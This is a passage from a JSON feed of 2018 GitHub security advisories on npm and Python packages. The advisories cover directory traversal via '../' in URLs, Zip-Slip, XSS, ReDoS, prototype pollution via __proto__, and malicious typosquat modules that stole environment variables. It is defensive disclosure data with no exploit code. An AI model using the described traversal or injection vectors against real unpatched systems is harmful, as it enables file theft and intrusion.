    "description": "serve node module before 6.4.9 suffers from a Path Traversal vulnerability due to not handling %2e (.) and %2f (/) and allowing them in paths, which allows a malicious user to view the contents of any directory with known path.",
    "summary": "Moderate severity vulnerability that affects serve"
  },
  {
    "ghsaId": "GHSA-3v6h-hqm4-2rg6",
    "publishedAt": "2018-07-27T17:07:14Z",
    "description": "adm-zip npm library before 0.4.11 is vulnerable to directory traversal, allowing attackers to write to arbitrary files via a ../ (dot dot slash) in a Zip archive entry that is mishandled during extraction. This vulnerability is also known as 'Zip-Slip'.",
    "summary": "High severity vulnerability that affects adm-zip"
  },
  {
    "ghsaId": "GHSA-884w-698f-927f",
    "publishedAt": "2018-07-27T17:06:50Z",
    "description": "unzipper npm library before 0.8.13 is vulnerable to directory traversal, allowing attackers to write to arbitrary files via a ../ (dot dot slash) in a Zip archive entry that is mishandled during extraction. This vulnerability is also known as 'Zip-Slip'.",
    "summary": "High severity vulnerability that affects unzipper"
  },
  {
    "ghsaId": "GHSA-wm77-q74p-5763",
    "publishedAt": "2018-07-27T17:06:03Z",
    "description": "serve node module suffers from Improper Handling of URL Encoding by permitting access to ignored files if a filename is URL encoded.",
    "summary": "High severity vulnerability that affects serve"
  },
  {
    "ghsaId": "GHSA-3c48-6pcv-88rm",
    "publishedAt": "2018-07-27T17:05:27Z",
    "description": "MathJax version prior to version 2.7.4 contains a Cross Site Scripting (XSS) vulnerability in the \\unicode{} macro that can result in Potentially untrusted Javascript running within a web browser. This attack appear to be exploitable via The victim must view a page where untrusted content is processed using Mathjax. This vulnerability appears to have been fixed in 2.7.4 and later.",
    "summary": "High severity vulnerability that affects mathjax"
  },
  {
    "ghsaId": "GHSA-488m-6gh8-9j36",
    "publishedAt": "2018-07-27T17:05:06Z",
    "description": "bracket-template suffers from reflected XSS possible when variable passed via GET parameter is used in template",
    "summary": "Moderate severity vulnerability that affects bracket-template"
  },
  {
    "ghsaId": "GHSA-8g7p-74h8-hg48",
    "publishedAt": "2018-07-27T17:04:52Z",
    "description": "https-proxy-agent passes unsanitized options to Buffer(arg) resulting in DoS and uninitialized memory leak.",
    "summary": "Denial of Service in https-proxy-agent"
  },
  {
    "ghsaId": "GHSA-3r8f-gphx-9m2c",
    "publishedAt": "2018-07-27T17:04:16Z",
    "description": "mcstatic node module suffers from a Path Traversal vulnerability due to lack of validation of filePath, which allows a malicious user to read content of any file with known path.",
    "summary": "High severity vulnerability that affects mcstatic"
  },
  {
    "ghsaId": "GHSA-p7c9-jqhq-vr3v",
    "publishedAt": "2018-07-27T17:03:46Z",
    "description": "A path traversal exists in markdown-pdf version <9.0.0 that allows a user to insert a malicious html code that can result in reading the local files.",
    "summary": "High severity vulnerability that affects markdown-pdf"
  },
  {
    "ghsaId": "GHSA-g8q2-24jh-5hpc",
    "publishedAt": "2018-07-27T14:47:52Z",
    "description": "Withdrawn, accidental duplicate publish.\r\n\r\nCross-site scripting (XSS) vulnerability in jQuery UI before 1.12.0 might allow remote attackers to inject arbitrary web script or HTML via the closeText parameter of the dialog function.",
    "summary": "High severity vulnerability that affects jquery-ui"
  },
  {
    "ghsaId": "GHSA-j3wh-5m26-2pf7",
    "publishedAt": "2018-07-27T14:34:11Z",
    "description": "mystem-fix is a node.js wrapper for MyStem morphology text analyzer by Yandex.ru mystem-fix downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested resources with an attacker controlled copy if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects mystem-fix"
  },
  {
    "ghsaId": "GHSA-6w83-22gj-5pv9",
    "publishedAt": "2018-07-27T14:06:00Z",
    "description": "cyber-js is a simple http server. A cyberjs server is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url.",
    "summary": "High severity vulnerability that affects cyber-js"
  },
  {
    "ghsaId": "GHSA-wxvm-fh75-mpgr",
    "publishedAt": "2018-07-26T16:24:34Z",
    "description": "Withdrawn, accidental duplicate publish.\r\n\r\nThe dns-sync module before 0.1.1 for node.js allows context-dependent attackers to execute arbitrary commands via shell metacharacters in the first argument to the resolve API function.",
    "summary": "Critical severity vulnerability that affects dns-sync"
  },
  {
    "ghsaId": "GHSA-cgqv-x5cx-xvqh",
    "publishedAt": "2018-07-26T16:22:08Z",
    "description": "An arbitrary code injection vector was found in PouchDB 6.0.4 and lesser via the map/reduce functions used in PouchDB temporary views and design documents. The code execution engine for this branch is not properly sandboxed and may be used to run arbitrary JavaScript as well as system commands.",
    "summary": "Critical severity vulnerability that affects pouchdb"
  },
  {
    "ghsaId": "GHSA-r38r-qp28-2m63",
    "publishedAt": "2018-07-26T16:08:49Z",
    "description": "base/oi/doa.py in the Rope library in CPython (aka Python) allows remote attackers to execute arbitrary code by leveraging an unsafe call to pickle.load.",
    "summary": "Critical severity vulnerability that affects rope"
  },
  {
    "ghsaId": "GHSA-73jp-3c67-hjfv",
    "publishedAt": "2018-07-26T15:53:31Z",
    "description": "The Microsoft Azure Active Directory Passport (aka Passport-Azure-AD) library 1.x before 1.4.6 and 2.x before 2.0.1 for Node.js does not recognize the validateIssuer setting, which allows remote attackers to bypass authentication via a crafted token.",
    "summary": "Critical severity vulnerability that affects passport-azure-ad"
  },
  {
    "ghsaId": "GHSA-x26f-26qw-hhhx",
    "publishedAt": "2018-07-26T15:22:00Z",
    "description": "hekto node module suffers from a Path Traversal vulnerability due to lack of validation of file, which allows a malicious user to read content of any file with known path.",
    "summary": "High severity vulnerability that affects hekto"
  },
  {
    "ghsaId": "GHSA-wv2f-3rxv-jqhp",
    "publishedAt": "2018-07-26T15:21:04Z",
    "description": "general-file-server node module suffers from a Path Traversal vulnerability due to lack of validation of currpath, which allows a malicious user to read content of any file with known path.",
    "summary": "High severity vulnerability that affects general-file-server"
  },
  {
    "ghsaId": "GHSA-cqp5-m4pq-gfgp",
    "publishedAt": "2018-07-26T15:18:43Z",
    "description": "defaults-deep node module before 0.2.4 suffers from a Modification of Assumed-Immutable Data (MAID) vulnerability, which allows a malicious user to modify the prototype of \"Object\" via __proto__, causing the addition or modification of an existing property that will exist on all objects.",
    "summary": "High severity vulnerability that affects default-deep"
  },
  {
    "ghsaId": "GHSA-9g9w-hmvj-5h57",
    "publishedAt": "2018-07-26T15:17:15Z",
    "description": "merge-deep node module before 3.0.1 suffers from a Modification of Assumed-Immutable Data (MAID) vulnerability, which allows a malicious user to modify the prototype of \"Object\" via __proto__, causing the addition or modification of an existing property that will exist on all objects.",
    "summary": "High severity vulnerability that affects merge-deep"
  },
  {
    "ghsaId": "GHSA-fvqr-27wr-82fm",
    "publishedAt": "2018-07-26T15:14:52Z",
    "description": "lodash node module before 4.17.5 suffers from a Modification of Assumed-Immutable Data (MAID) vulnerability via defaultsDeep, merge, and mergeWith functions, which allows a malicious user to modify the prototype of \"Object\" via __proto__, causing the addition or modification of an existing property that will exist on all objects.",
    "summary": "Moderate severity vulnerability that affects lodash"
  },
  {
    "ghsaId": "GHSA-xcvv-84j5-jw9h",
    "publishedAt": "2018-07-26T15:12:31Z",
    "description": "assign-deep node module before 0.4.7 suffers from a Modification of Assumed-Immutable Data (MAID) vulnerability, which allows a malicious user to modify the prototype of \"Object\" via __proto__, causing the addition or modification of an existing property that will exist on all objects.",
    "summary": "High severity vulnerability that affects assign-deep"
  },
  {
    "ghsaId": "GHSA-3mpr-hq3p-49h9",
    "publishedAt": "2018-07-26T15:10:54Z",
    "description": "mixin-deep node module before 1.3.1 suffers from a Modification of Assumed-Immutable Data (MAID) vulnerability, which allows a malicious user to modify the prototype of \"Object\" via __proto__, causing the addition or modification of an existing property that will exist on all objects.",
    "summary": "High severity vulnerability that affects mixin-deep"
  },
  {
    "ghsaId": "GHSA-rch9-xh7r-mqgw",
    "publishedAt": "2018-07-26T15:08:05Z",
    "description": "connect node module before 2.14.0 suffers from a Cross-Site Scripting (XSS) vulnerability due to a lack of validation of file in directory.js middleware.",
    "summary": "Moderate severity vulnerability that affects anywhere and simple-server"
  },
  {
    "ghsaId": "GHSA-jrhj-2j3q-xf3v",
    "publishedAt": "2018-07-26T15:03:30Z",
    "description": "simplehttpserver node module suffers from a Cross-Site Scripting vulnerability to a lack of validation of file names.",
    "summary": "High severity vulnerability that affects simplehttpserver"
  },
  {
    "ghsaId": "GHSA-2x4q-6jfv-8h9h",
    "publishedAt": "2018-07-26T14:53:14Z",
    "description": "glance node module before 3.0.4 suffers from a Path Traversal vulnerability due to lack of validation of path passed to it, which allows a malicious user to read content of any file with known path.",
    "summary": "High severity vulnerability that affects glance"
  },
  {
    "ghsaId": "GHSA-52r9-g5g6-2hjp",
    "publishedAt": "2018-07-26T14:50:41Z",
    "description": "node-srv node module suffers from a Path Traversal vulnerability due to lack of validation of url, which allows a malicious user to read content of any file with known path.",
    "summary": "High severity vulnerability that affects node-srv"
  },
  {
    "ghsaId": "GHSA-4rvg-955w-h68q",
    "publishedAt": "2018-07-26T14:47:40Z",
    "description": "angular-http-server node module suffers from a Path Traversal vulnerability due to lack of validation of possibleFilename, which allows a malicious user to read content of any file with known path.",
    "summary": "High severity vulnerability that affects angular-http-server"
  },
  {
    "ghsaId": "GHSA-2gjg-5x33-mmp2",
    "publishedAt": "2018-07-25T22:44:05Z",
    "description": "localhost-now node module suffers from a Path Traversal vulnerability due to lack of validation of file, which allows a malicious user to read content of any file with known path.",
    "summary": "Moderate severity vulnerability that affects localhost-now"
  },
  {
    "ghsaId": "GHSA-9qj9-36jm-prpv",
    "publishedAt": "2018-07-24T20:16:57Z",
    "description": "Fresh is a module used by the Express.js framework for HTTP response freshness testing. It is vulnerable to a regular expression denial of service when it is passed specially crafted input to parse. This causes the event loop to be blocked causing a denial of service condition.",
    "summary": "High severity vulnerability that affects fresh"
  },
  {
    "ghsaId": "GHSA-mpcf-4gmh-23w8",
    "publishedAt": "2018-07-24T20:16:30Z",
    "description": "The forwarded module is used by the Express.js framework to handle the X-Forwarded-For header. It is vulnerable to a regular expression denial of service when it's passed specially crafted input to parse. This causes the event loop to be blocked causing a denial of service condition.",
    "summary": "High severity vulnerability that affects forwarded"
  },
  {
    "ghsaId": "GHSA-g36h-6r4f-3mqp",
    "publishedAt": "2018-07-24T20:16:11Z",
    "description": "The string module is a module that provides extra string operations. The string module is vulnerable to regular expression denial of service when specifically crafted untrusted user input is passed into the underscore or unescapeHTML methods.",
    "summary": "High severity vulnerability that affects string"
  },
  {
    "ghsaId": "GHSA-hvr8-466p-75rh",
    "publishedAt": "2018-07-24T20:15:48Z",
    "description": "Integer overflow in the ImagingResampleHorizontal function in libImaging/Resample.c in Pillow before 3.1.1 allows remote attackers to have unspecified impact via negative values of the new size, which triggers a heap-based buffer overflow.",
    "summary": "High severity vulnerability that affects Pillow"
  },
  {
    "ghsaId": "GHSA-8xjv-v9xq-m5h9",
    "publishedAt": "2018-07-24T20:15:36Z",
    "description": "Buffer overflow in the ImagingFliDecode function in libImaging/FliDecode.c in Pillow before 3.1.1 allows remote attackers to cause a denial of service (crash) via a crafted FLI file.",
    "summary": "Moderate severity vulnerability that affects Pillow"
  },
  {
    "ghsaId": "GHSA-3c5c-7235-994j",
    "publishedAt": "2018-07-24T20:15:13Z",
    "description": "Buffer overflow in the ImagingPcdDecode function in PcdDecode.c in Pillow before 3.1.1 and Python Imaging Library (PIL) 1.1.7 and earlier allows remote attackers to cause a denial of service (crash) via a crafted PhotoCD file.",
    "summary": "Moderate severity vulnerability that affects Pillow"
  },
  {
    "ghsaId": "GHSA-g7q5-pjjr-gqvp",
    "publishedAt": "2018-07-24T20:14:39Z",
    "description": "A ReDoS (regular expression denial of service) flaw was found in the tough-cookie module before 2.3.3 for Node.js. An attacker that is able to make an HTTP request using a specially crafted cookie may cause the application to consume an excessive amount of CPU.",
    "summary": "High severity vulnerability that affects tough-cookie"
  },
  {
    "ghsaId": "GHSA-q75g-2496-mxpp",
    "publishedAt": "2018-07-24T20:11:13Z",
    "description": "The parsejson module is vulnerable to regular expression denial of service when untrusted user input is passed into it to be parsed.",
    "summary": "High severity vulnerability that affects parsejson"
  },
  {
    "ghsaId": "GHSA-x5pg-88wf-qq4p",
    "publishedAt": "2018-07-24T20:10:52Z",
    "description": "The marked module is vulnerable to a regular expression denial of service. Based on the information published in the public issue, 1k characters can block for around 6 seconds.",
    "summary": "High severity vulnerability that affects marked"
  },
  {
    "ghsaId": "GHSA-rwr3-c2q8-gm56",
    "publishedAt": "2018-07-24T20:08:27Z",
    "description": "Pillow before 3.3.2 allows context-dependent attackers to obtain sensitive information by using the \"crafted image file\" approach, related to an \"Integer Overflow\" issue affecting the Image.core.map_buffer in map.c component.",
    "summary": "Moderate severity vulnerability that affects Pillow"
  },
  {
    "ghsaId": "GHSA-jxqq-cqm6-pfq9",
    "publishedAt": "2018-07-24T20:06:45Z",
    "description": "slug is a module to slugify strings, even if they contain unicode. slug is vulnerable to regular expression denial of service is specially crafted untrusted input is passed as input. About 50k characters can block the event loop for 2 seconds.",
    "summary": "High severity vulnerability that affects slug"
  },
  {
    "ghsaId": "GHSA-3pwh-5mmc-mwrx",
    "publishedAt": "2018-07-24T20:06:33Z",
    "description": "Nes is a websocket extension library for hapi. Hapi is a webserver framework. Versions below and including 6.4.0 have a denial of service vulnerability via an invalid Cookie header. This is only present when websocket authentication is set to `cookie`. Submitting an invalid cookie on the websocket upgrade request will cause the node process to error out.",
    "summary": "High severity vulnerability that affects nes"
  },
  {
    "ghsaId": "GHSA-fx46-whrj-73v5",
    "publishedAt": "2018-07-24T20:06:17Z",
    "description": "html-janitor node module suffers from an External Control of Critical State Data vulnerability via user-control of the '_sanitized' variable causing sanitization to be bypassed.",
    "summary": "High severity vulnerability that affects html-janitor"
  },
  {
    "ghsaId": "GHSA-qx2f-477c-35rq",
    "publishedAt": "2018-07-24T20:06:04Z",
    "description": "method-override is a module used by the Express.js framework to let you use HTTP verbs such as PUT or DELETE in places where the client doesn't support it. method-override is vulnerable to a regular expression denial of service vulnerability when specially crafted input is passed in to be parsed via the X-HTTP-Method-Override header.",
    "summary": "High severity vulnerability that affects method-override"
  },
  {
    "ghsaId": "GHSA-4w88-rjj3-x7wp",
    "publishedAt": "2018-07-24T20:04:23Z",
    "description": "Based on details posted by the ElectronJS team; A remote code execution vulnerability has been discovered in Google Chromium that affects all recent versions of Electron. Any Electron app that accesses remote content is vulnerable to this exploit, regardless of whether the [sandbox option](https://electron.atom.io/docs/api/sandbox-option) is enabled.",
    "summary": "High severity vulnerability that affects electron"
  },
  {
    "ghsaId": "GHSA-6xhf-x49c-m5m6",
    "publishedAt": "2018-07-24T20:04:11Z",
    "description": "aegir is a module to help automate JavaScript project management. Version 12.0.0 through and including 12.0.7 bundled and published to npm the user (that performed a aegir-release) GitHub token.",
    "summary": "High severity vulnerability that affects aegir"
  },
  {
    "ghsaId": "GHSA-hggx-3h72-49ww",
    "publishedAt": "2018-07-24T20:03:51Z",
    "description": "Buffer overflow in the ImagingLibTiffDecode function in libImaging/TiffDecode.c in Pillow before 3.1.1 allows remote attackers to overwrite memory via a crafted TIFF file.",
    "summary": "Moderate severity vulnerability that affects Pillow"
  },
  {
    "ghsaId": "GHSA-hjf3-r7gw-9rwg",
    "publishedAt": "2018-07-24T20:00:41Z",
    "description": "Universal Feed Parser (aka feedparser or python-feedparser) before 5.1.2 allows remote attackers to cause a denial of service (memory consumption) via a crafted XML ENTITY declaration in a non-ASCII encoded document.",
    "summary": "Moderate severity vulnerability that affects feedparser"
  },
  {
    "ghsaId": "GHSA-333w-rxj3-f55r",
    "publishedAt": "2018-07-24T20:00:30Z",
    "description": "uri-js is a module that tries to fully implement RFC 3986. One of these features is validating whether or not a supplied URL is valid or not. To do this, uri-js uses a regular expression, This regular expression is vulnerable to redos. This causes the program to hang and the CPU to idle at 100% usage while uri-js is trying to validate if the supplied URL is valid or not. To check if you're vulnerable, look for a call to `require(\"uri-js\").parse()` where a user is able to send their own input. This affects uri-js 2.1.1 and earlier.",
    "summary": "High severity vulnerability that affects uri-js"
  },
  {
    "ghsaId": "GHSA-q5c4-39f5-m68j",
    "publishedAt": "2018-07-24T20:00:17Z",
    "description": "Decamelize is used to convert a dash/dot/underscore/space separated string to camelCase. Decamelize 1.1.0 through 1.1.1 uses regular expressions to evaluate a string and takes unescaped separator values, which can be used to create a denial of service attack.",
    "summary": "High severity vulnerability that affects decamelize"
  },
  {
    "ghsaId": "GHSA-pjmx-9xr3-82qr",
    "publishedAt": "2018-07-24T19:59:13Z",
    "description": "Useragent is used to parse useragent headers. It uses several regular expressions to accomplish this. An attacker could edit their own headers, creating an arbitrarily long useragent string, causing the event loop and server to block. This affects Useragent 2.1.12 and earlier.",
    "summary": "High severity vulnerability that affects useragent"
  },
  {
    "ghsaId": "GHSA-cmh5-qc8w-xvcq",
    "publishedAt": "2018-07-24T19:58:33Z",
    "description": "i18next is a language translation framework. When using the .init method, passing interpolation options without passing an escapeValue will default to undefined rather than the assumed true. This can result in a cross-site scripting vulnerability because user input is assumed to be escaped, but is not. This vulnerability affects i18next 2.0.0 and later.",
    "summary": "High severity vulnerability that affects i18next"
  },
  {
    "ghsaId": "GHSA-x6wp-rfwh-hcx7",
    "publishedAt": "2018-07-24T19:55:05Z",
    "description": "The content module is a module to parse HTTP Content-* headers. It is used by the hapijs framework to provide this functionality. The module is vulnerable to regular expression denial of service when passed a specifically crafted Content-Type or Content-Disposition header.",
    "summary": "High severity vulnerability that affects content"
  },
  {
    "ghsaId": "GHSA-ff6r-5jwm-8292",
    "publishedAt": "2018-07-24T19:51:16Z",
    "description": "The no-case module is vulnerable to regular expression denial of service. When malicious untrusted user input is passed into no-case it can block the event loop causing a denial of service condition.",
    "summary": "High severity vulnerability that affects no-case"
  },
  {
    "ghsaId": "GHSA-pmg9-p9r2-6q87",
    "publishedAt": "2018-07-24T19:46:37Z",
    "description": "ua-parser is a port of Browserscope's user agent parser. ua-parser is vulnerable to a ReDoS (Regular Expression Denial of Service) attack when given a specially crafted UserAgent header. Consider using a different package such as [useragent](https://www.npmjs.com/package/useragent).",
    "summary": "High severity vulnerability that affects ua-parser"
  },
  {
    "ghsaId": "GHSA-wc9v-mj63-m9g5",
    "publishedAt": "2018-07-24T19:44:42Z",
    "description": "A remote code execution vulnerability was found within the pg module when the remote database or query specifies a specially crafted column name. There are 2 likely scenarios in which one would likely be vulnerable. 1) Executing unsafe, user-supplied sql which contains a malicious column name. 2) Connecting to an untrusted database and executing a query which returns results where any of the column names are malicious.",
    "summary": "High severity vulnerability that affects pg"
  },
  {
    "ghsaId": "GHSA-5w8q-x7hc-jhp6",
    "publishedAt": "2018-07-24T19:42:39Z",
    "description": "node-simple-router is a minimalistic router for Node. node-simple-router is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the URL.",
    "summary": "High severity vulnerability that affects node-simple-router"
  },
  {
    "ghsaId": "GHSA-g7j3-p357-cw8p",
    "publishedAt": "2018-07-24T16:29:12Z",
    "description": "`f2e-server` 1.12.11 and earlier is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url. This is compounded by `f2e-server` requiring elevated privileges to run.",
    "summary": "High severity vulnerability that affects f2e-server"
  },
  {
    "ghsaId": "GHSA-w23f-f3c5-r9qh",
    "publishedAt": "2018-07-24T15:56:19Z",
    "description": "ikst versions before 1.1.2 download resources over HTTP, which leaves it vulnerable to MITM attacks.",
    "summary": "High severity vulnerability that affects ikst"
  },
  {
    "ghsaId": "GHSA-76p6-gpvf-6wmv",
    "publishedAt": "2018-07-24T15:50:28Z",
    "description": "`hftp` is a static http or ftp server `hftp` is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url.",
    "summary": "High severity vulnerability that affects hftp"
  },
  {
    "ghsaId": "GHSA-94x5-94wf-m445",
    "publishedAt": "2018-07-24T15:48:38Z",
    "description": "`gomeplus-h5-proxy` is vulnerable to a directory traversal issue, allowing attackers to access any file in the system by placing '../' in the URL.",
    "summary": "High severity vulnerability that affects gomeplus-h5-proxy"
  },
  {
    "ghsaId": "GHSA-xq98-5rcf-5wqh",
    "publishedAt": "2018-07-24T15:43:02Z",
    "description": "`badjs-sourcemap-server` receives files sent by `badjs-sourcemap`. `badjs-sourcemap-server` is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url.",
    "summary": "High severity vulnerability that affects badjs-sourcemap-server"
  },
  {
    "ghsaId": "GHSA-h8mc-42c3-r72p",
    "publishedAt": "2018-07-24T15:40:47Z",
    "description": "The hubl-server module is a wrapper for the HubL Development Server. During installation hubl-server downloads a set of dependencies from api.hubapi.com. It appears in the code that these files are downloaded over HTTPS however the api.hubapi.com endpoint redirects to a HTTP url. Because of this behavior an attacker with the ability to man-in-the-middle a developer or system performing a package installation could compromise the integrity of the installation.",
    "summary": "High severity vulnerability that affects hubl-server"
  },
  {
    "ghsaId": "GHSA-g8wf-rcg3-qw4q",
    "publishedAt": "2018-07-24T15:01:34Z",
    "description": "tinyserver2 is a webserver for static files. tinyserver2 is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the URL.",
    "summary": "High severity vulnerability that affects tinyserver2"
  },
  {
    "ghsaId": "GHSA-23vf-5g53-hm9q",
    "publishedAt": "2018-07-24T14:57:31Z",
    "description": "list-n-stream is a server for static files to list and stream local videos. list-n-stream v0.0.10 or lower is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url.",
    "summary": "High severity vulnerability that affects list-n-stream"
  },
  {
    "ghsaId": "GHSA-3cgg-gh9j-w8vm",
    "publishedAt": "2018-07-24T13:58:10Z",
    "description": "iter-http is a server for static files. iter-http is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url.",
    "summary": "High severity vulnerability that affects iter-http"
  },
  {
    "ghsaId": "GHSA-6866-x7cf-rmh5",
    "publishedAt": "2018-07-24T13:50:01Z",
    "description": "Sencisho is a simple http server for local development. Sencisho is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the URL.",
    "summary": "High severity vulnerability that affects sencisho"
  },
  {
    "ghsaId": "GHSA-cfxm-4p54-5w7h",
    "publishedAt": "2018-07-24T00:20:57Z",
    "description": "pooledwebsocket is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url.",
    "summary": "High severity vulnerability that affects pooledwebsocket"
  },
  {
    "ghsaId": "GHSA-vxwf-pprx-wc25",
    "publishedAt": "2018-07-24T00:10:03Z",
    "description": "citypredict.whauwiller is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url.",
    "summary": "High severity vulnerability that affects citypredict.whauwiller"
  },
  {
    "ghsaId": "GHSA-j6w4-pg6p-5mrv",
    "publishedAt": "2018-07-23T23:51:04Z",
    "description": "tmock is a static file server. tmock is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url.",
    "summary": "High severity vulnerability that affects tmock"
  },
  {
    "ghsaId": "GHSA-j38m-7q52-fgfh",
    "publishedAt": "2018-07-23T23:33:42Z",
    "description": "node-server-forfront is a simple static file server. node-server-forfront is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url.",
    "summary": "High severity vulnerability that affects node-server-forfront"
  },
  {
    "ghsaId": "GHSA-jpg7-6c9f-7q54",
    "publishedAt": "2018-07-23T23:15:21Z",
    "description": "datachannel-client is a signaling implementation for DataChannel.js. datachannel-client is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url.",
    "summary": "High severity vulnerability that affects datachannel-client"
  },
  {
    "ghsaId": "GHSA-vcqg-cmv3-wj57",
    "publishedAt": "2018-07-23T22:48:49Z",
    "description": "rtcmulticonnection-client is a signaling implementation for RTCMultiConnection.js, a multi-session manager. rtcmulticonnection-client is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url.",
    "summary": "High severity vulnerability that affects rtcmulticonnection-client"
  },
  {
    "ghsaId": "GHSA-3grc-fgh6-g5gp",
    "publishedAt": "2018-07-23T22:08:39Z",
    "description": "http_static_simple is an http server. http_static_simple is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url.",
    "summary": "High severity vulnerability that affects http_static_simple"
  },
  {
    "ghsaId": "GHSA-pq5x-rprq-8jrj",
    "publishedAt": "2018-07-23T22:06:14Z",
    "description": "exxxxxxxxxxx is an Http eX Frame Google Style JavaScript Guide. exxxxxxxxxxx is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url. Accessible files are restricted to those with a file extension. Files with no extension such as /etc/passwd throw an error.",
    "summary": "High severity vulnerability that affects exxxxxxxxxxx"
  },
  {
    "ghsaId": "GHSA-h6hq-c896-w882",
    "publishedAt": "2018-07-23T21:01:10Z",
    "description": "Cross-site scripting (XSS) vulnerability in the safe_html filter in Products.PortalTransforms in Plone 2.1 through 4.1 allows remote authenticated users to inject arbitrary web script or HTML via unspecified vectors, a different vulnerability than CVE-2010-2422.",
    "summary": "Low severity vulnerability that affects Plone"
  },
  {
    "ghsaId": "GHSA-8m3r-rv5g-fcpq",
    "publishedAt": "2018-07-23T21:01:00Z",
    "description": "Cross-site scripting (XSS) vulnerability in Django 1.1.x before 1.1.4 and 1.2.x before 1.2.5 might allow remote attackers to inject arbitrary web script or HTML via a filename associated with a file upload.",
    "summary": "Moderate severity vulnerability that affects django"
  },
  {
    "ghsaId": "GHSA-qmjg-g86h-6rc9",
    "publishedAt": "2018-07-23T21:00:28Z",
    "description": "`d3.js` was a malicious module published with the intent to hijack environment variables. It has been unpublished by npm.",
    "summary": "Moderate severity vulnerability that affects d3.js"
  },
  {
    "ghsaId": "GHSA-x52f-h74p-9jh8",
    "publishedAt": "2018-07-23T21:00:07Z",
    "description": "`node-sqlite` was a malicious module published with the intent to hijack environment variables. It has been unpublished by npm.",
    "summary": "Moderate severity vulnerability that affects node-sqlite"
  },
  {
    "ghsaId": "GHSA-jp27-cwp2-5qqr",
    "publishedAt": "2018-07-23T20:54:24Z",
    "description": "`jquery.js` was a malicious module published with the intent to hijack environment variables. It has been unpublished by npm.",
    "summary": "Moderate severity vulnerability that affects jquery.js"
  },
  {
    "ghsaId": "GHSA-6f34-pq9f-36vf",
    "publishedAt": "2018-07-23T20:50:29Z",
    "description": "`sqlite.js` was a malicious module published with the intent to hijack environment variables. It has been unpublished by npm.",
    "summary": "Moderate severity vulnerability that affects sqlite.js"
  },
  {
    "ghsaId": "GHSA-wwf2-5cj8-jx6w",
    "publishedAt": "2018-07-23T20:50:21Z",
    "description": "`nodesqlite` was a malicious module published with the intent to hijack environment variables. It has been unpublished by npm.",
    "summary": "Moderate severity vulnerability that affects nodesqlite"
  },
  {
    "ghsaId": "GHSA-v73m-fjxv-w4rh",
    "publishedAt": "2018-07-23T20:50:18Z",
    "description": "`fabric-js` was a malicious module published with the intent to hijack environment variables. It has been unpublished by npm.",
    "summary": "Moderate severity vulnerability that affects fabric-js"
  },
  {
    "ghsaId": "GHSA-gfv4-2vhm-486m",
    "publishedAt": "2018-07-23T20:50:10Z",
    "description": "`node-fabric` was a malicious module published with the intent to hijack environment variables. It has been unpublished by npm.",
    "summary": "Moderate severity vulnerability that affects node-fabric"
  },
  {
    "ghsaId": "GHSA-22j5-38qv-pxx7",
    "publishedAt": "2018-07-23T20:50:04Z",
    "description": "`sqliter` was a malicious module published with the intent to hijack environment variables. It has been unpublished by npm.",
    "summary": "Moderate severity vulnerability that affects sqliter"
  },
  {
    "ghsaId": "GHSA-8qp3-pvwc-2g4p",
    "publishedAt": "2018-07-23T20:49:58Z",
    "description": "`nodefabric` was a malicious module published with the intent to hijack environment variables. It has been unpublished by npm.",
    "summary": "Moderate severity vulnerability that affects nodefabric"
  },
  {
    "ghsaId": "GHSA-3vg2-4qxc-ch4j",
    "publishedAt": "2018-07-23T20:49:38Z",
    "description": "unicorn-list is a web framework. unicorn-list is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url.",
    "summary": "High severity vulnerability that affects unicorn-list"
  },
  {
    "ghsaId": "GHSA-hqw4-8893-j4h7",
    "publishedAt": "2018-07-23T20:49:28Z",
    "description": "simple-npm-registry is a local npm package cache. simple-npm-registry is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url.",
    "summary": "High severity vulnerability that affects simple-npm-registry"
  },
  {
    "ghsaId": "GHSA-pwqj-h62h-q35c",
    "publishedAt": "2018-07-23T20:49:03Z",
    "description": "goserv is an http server. goserv is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url.",
    "summary": "High severity vulnerability that affects goserv"
  },
  {
    "ghsaId": "GHSA-7vq3-wcjw-3fxh",
    "publishedAt": "2018-07-23T20:48:53Z",
    "description": "lab6.brit95 is a file server. lab6.brit95 is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url.",
    "summary": "High severity vulnerability that affects lab6.brit95"
  },
  {
    "ghsaId": "GHSA-7pgq-hhq9-9r27",
    "publishedAt": "2018-07-23T20:48:38Z",
    "description": "lab6drewfusbyu is an http server. lab6drewfusbyu is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url.",
    "summary": "High severity vulnerability that affects lab6drewfusbyu"
  },
  {
    "ghsaId": "GHSA-v464-rcx7-j875",
    "publishedAt": "2018-07-23T20:48:29Z",
    "description": "infraserver is a RESTful server. infraserver is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url.",
    "summary": "High severity vulnerability that affects infraserver"
  },
  {
    "ghsaId": "GHSA-j5mg-fpq8-vvxv",
    "publishedAt": "2018-07-23T20:48:14Z",
